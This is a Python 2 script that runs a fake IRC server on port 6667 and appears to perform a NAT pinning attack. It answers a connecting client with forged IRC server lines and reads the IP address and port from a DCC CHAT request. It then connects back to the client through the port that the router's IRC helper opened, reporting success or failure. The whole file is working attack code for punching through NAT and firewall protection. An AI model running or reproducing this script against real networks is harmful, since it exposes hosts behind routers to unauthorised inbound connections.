#!/usr/bin/env python
from optparse import OptionParser
from threading import Thread
import random
import socket
import struct

EXIT_AFTER_CALLBACK = 1

s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind(("",6667))
s.listen(1)

def callback(host,port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		
		s.connect((host,port))
		s.send("test\n")
		s.close()
		return 1
	except:
		return 0
#end def

cSock, cAddr = s.accept()
print "Accepted connection from " + cAddr[0]
cFile = cSock.makefile('rw',0)
cFile.write("irc.khleuven.be NOTICE AUTH :*** Looking up your hostname...\r\n")
while 1:
	line = cFile.readline().strip()
	parts = line.split(" ")
	#print line #use for debugging
	if parts[0]=="NICK":
		cFile.write(":irc.khleuven.be 376 natpin252 :End of /MOTD command.\r\n")
	elif parts[0] == "PRIVMSG":
		if parts[3] == "CHAT":
			numip = long(parts[5])
			numip = socket.inet_ntoa(struct.pack('!I', numip))		
			numport = parts[6].replace("\x01","")
			callb_line = "Nat PIN " + cAddr[0] + "=> " + str(numip) + " on port " + numport
			if callback(cAddr[0],int(numport)) == 1:
				print callb_line + " :Success"
			else:
				print callb_line + " :Failed"
			if EXIT_AFTER_CALLBACK==1:
				s.close()
				break
		print parts
#end while


